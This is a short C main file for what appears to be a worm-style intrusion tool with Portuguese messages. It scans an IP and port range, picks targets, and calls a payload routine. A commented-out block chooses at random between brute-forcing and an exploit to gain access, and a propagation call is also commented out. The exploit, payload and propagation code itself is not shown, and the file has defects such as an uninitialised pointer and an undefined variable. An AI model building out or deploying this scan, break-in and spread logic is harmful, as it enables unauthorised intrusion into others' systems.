#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "bruteforce.h"
#include "exploit.h"
#include "payload.h"
#include "portscanner.h"
#include "propagation_engine.h"
#include "target_selection.h"

void main(int argc, char *argv[]){
    char range_ipSeq[100];
    char range_portSeq[100];
    char **paramIPPort;
    unsigned int lenKey;
    int random, success;

    if(argc < 4){
        printf("Entrada incorreta.\n\n");
        fflush(stdout);
        printf("A entrada deve seguir o seguinte modelo: ./recon <ip ou range de ips> <porta ou range de portas> <tamanho da chave>\n");
        fflush(stdout);
        exit(0);
    }

    //Pega os ranges
    strcpy(range_ipSeq, argv[1]);
    strcpy(range_portSeq, argv[2]);
    lenKey = atoi(argv[3]);
 
    initPortScanner(range_ipSeq, range_portSeq);

    srand(time(NULL));
    random = rand();

    target_selection(paramIPPort);

/*    if(random % 2){
        success = bruteforce(lenKey);
        if(success == 0){
            success = exploit_main(argc, argv, opt);
            if(success == 0){
                printf("Não foi possivel obter acesso.\n");
                exit(0);
            }
        }
    }else{
        success = exploit_main(argc, argv, opt);
        if(success == 0){
            success = bruteforce(lenKey);
            if(success == 0){
                printf("Não foi possivel obter acesso.\n");
                exit(0);
            }
        }
    }*/

    //propagation_engine();
    payload();
}
